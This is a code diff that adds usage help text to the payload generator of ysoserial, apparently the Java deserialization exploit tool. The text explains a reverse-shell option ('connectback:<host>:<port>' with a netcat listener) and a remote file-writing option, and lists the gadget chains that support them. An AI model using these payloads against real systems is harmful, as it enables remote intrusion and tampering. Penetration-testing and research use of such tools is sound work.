@@ -68,5 +68,16 @@ public class GeneratePayload {
         for (String line : lines) {
             System.err.println("     " + line);
         }
+        
+        System.err.println("  TemplatesImpl payloads have reverse command shell and file upload support. For");
+        System.err.println("  a reverse shell, start a netcat listener and use connectback:<host>:<port> as");
+        System.err.println("  the command string you supply to ysoserial e.g.\n");
+        System.err.println("    java -jar ysoserial-[version]-all.jar [gadget] connectback:<host>:<port>\n");
+        System.err.println("  To upload a file, use writefile:<localpath>:<remotepath> e.g.\n");
+        System.err.println("    java -jar ysoserial-[version]-all.jar [gadget] writefile:<local>:<remote>\n");
+        System.err.println("  Payloads supporting these features are: CommonsBeanutils1,");
+        System.err.println("    CommonsCollections2, CommonsCollections3, CommonsCollections4,");
+        System.err.println("    JBossInterceptors1, JavassistWels1, Jdk7u21, MozillaRhino1, ROME, Spring1,");
+        System.err.println("    Spring2\n");
     }
 }
